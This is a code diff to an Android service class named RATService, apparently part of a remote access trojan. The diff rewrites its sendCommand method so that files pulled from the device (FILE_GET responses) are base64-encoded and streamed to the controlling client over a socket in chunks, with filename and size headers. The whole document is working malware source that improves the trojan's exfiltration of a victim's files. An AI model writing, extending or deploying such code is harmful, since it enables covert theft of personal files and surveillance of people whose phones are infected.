@@ -646,47 +646,80 @@ public class RATService extends Service {
         Log.d(TAG, "Sent device info: " + info);
     }
 
-    private void sendCommand(String data) {
-        if (out != null) {
+   private void sendCommand(String data) {
+    if (out == null) return;
+    try {
+        // Threshold: if the full response is small, send normally
+        if (data.length() <= 65536) {
+            out.println(data);
+            out.flush();
+            Log.d(TAG, "📤 Sent (" + data.length() + " chars): "
+                    + (data.length() > 120 ? data.substring(0, 120) + "..." : data));
+            return;
+        }
+ 
+        // ── Large data: use clean chunk protocol ──────────────────────────────
+        // Only FILE_GET responses are large in practice.
+        // Parse out the filename and file size from the JSON so the client
+        // can show a proper progress bar without needing to buffer everything.
+ 
+        String fileName = "download";
+        long   fileSize = 0;
+        String base64Data = "";
+ 
+        if (data.startsWith("FILE_GET|")) {
             try {
-                // For very large data, send in chunks
-                if (data.length() > 65536) { // 64KB threshold
-                    Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
-
-                    // Send header with total size
-                    out.println("FILE_CHUNK|START|" + data.length());
-                    out.flush();
-
-                    // Send in 32KB chunks
-                    int chunkSize = 32768;
-                    for (int i = 0; i < data.length(); i += chunkSize) {
-                        int end = Math.min(i + chunkSize, data.length());
-                        String chunk = data.substring(i, end);
-                        out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
-                        out.flush();
-
-                        // Small delay to prevent overwhelming the socket
-                        try {
-                            Thread.sleep(10);
-                        } catch (InterruptedException e) {
-                            // Ignore
-                        }
-                    }
-
-                    // Send end marker
-                    out.println("FILE_CHUNK|END");
-                    out.flush();
+                // data = "FILE_GET|{\"success\":true,\"name\":\"foo\",\"size\":N,\"data\":\"<b64>\",...}"
+                String jsonPart = data.substring(9); // strip "FILE_GET|"
+                org.json.JSONObject obj = new org.json.JSONObject(jsonPart);
+                if (obj.optBoolean("success", false)) {
+                    fileName  = obj.optString("name", "download");
+                    fileSize  = obj.optLong("size", 0);
+                    base64Data = obj.optString("data", "");
                 } else {
-                    // Normal size, send normally
+                    // Error response — small enough to send normally
                     out.println(data);
                     out.flush();
+                    return;
                 }
-                Log.d(TAG, "📤 Sent: " + (data.length() > 100 ? data.substring(0, 100) + "..." : data));
             } catch (Exception e) {
-                Log.e(TAG, "Error sending command", e);
+                Log.e(TAG, "Failed to parse large FILE_GET response for chunking", e);
+                // Fall back to raw send (may get truncated but better than crashing)
+                out.println(data);
+                out.flush();
+                return;
             }
+        } else {
+            // Non-file large response: send as-is (shouldn't happen often)
+            out.println(data);
+            out.flush();
+            return;
         }
+ 
+        // Send START header: tells client filename + expected file size in bytes
+        out.println("FILE_CHUNK|START|" + fileName + "|" + fileSize);
+        out.flush();
+ 
+        // Send base64 data in 32 KB chunks (pure base64, no JSON wrapping)
+        int chunkSize = 32768;
+        for (int i = 0; i < base64Data.length(); i += chunkSize) {
+            int end = Math.min(i + chunkSize, base64Data.length());
+            out.println("FILE_CHUNK|DATA|" + base64Data.substring(i, end));
+            out.flush();
+            try { Thread.sleep(5); } catch (InterruptedException ignored) {}
+        }
+ 
+        // Send END marker
+        out.println("FILE_CHUNK|END");
+        out.flush();
+ 
+        Log.d(TAG, "📤 Chunked file sent: " + fileName
+                + " (" + base64Data.length() + " base64 chars, ~" + fileSize + " bytes)");
+ 
+    } catch (Exception e) {
+        Log.e(TAG, "Error in sendCommand", e);
     }
+}
 
     private void sendCommand(JSONObject json) {
         sendCommand(json.toString());
